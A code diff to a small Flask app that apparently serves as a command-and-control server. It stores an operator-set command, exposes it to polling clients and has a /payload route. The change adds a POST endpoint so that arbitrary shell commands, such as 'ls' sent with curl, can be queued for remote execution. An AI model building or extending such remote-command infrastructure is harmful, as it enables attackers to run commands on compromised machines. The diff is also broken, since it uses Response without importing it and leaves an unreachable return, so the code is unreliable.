@@ -1,4 +1,4 @@
-from flask import Flask
+from flask import Flask, request
 app = Flask(__name__)
 
 command = "idle"
@@ -20,10 +20,32 @@ done
 def get_cmd():
     return command
 
+# Simple commands via URL path
 @app.route("/set/<cmd>")
 def set_cmd(cmd):
     global command
     command = cmd
+    return "OK"
+
+# Complex commands via POST body
+@app.route("/set", methods=["POST"])
+def set_cmd_post():
+    global command
+    # Preferred: form field cmd=...
+    if request.form:
+        if "cmd" in request.form:
+            command = request.form.get("cmd", "")
+            return Response("OK\n", mimetype="text/plain")
+
+        # If user did: curl -d 'ls' ... then request.form == {'ls': ''}
+        if len(request.form) == 1:
+            command = next(iter(request.form.keys()))
+            return Response("OK\n", mimetype="text/plain")
+
+    # Otherwise treat it as raw text body
+    command = request.get_data(as_text=True) or ""
+    return Response("OK\n", mimetype="text/plain")
+
     return "OK"
 
 @app.route("/payload")
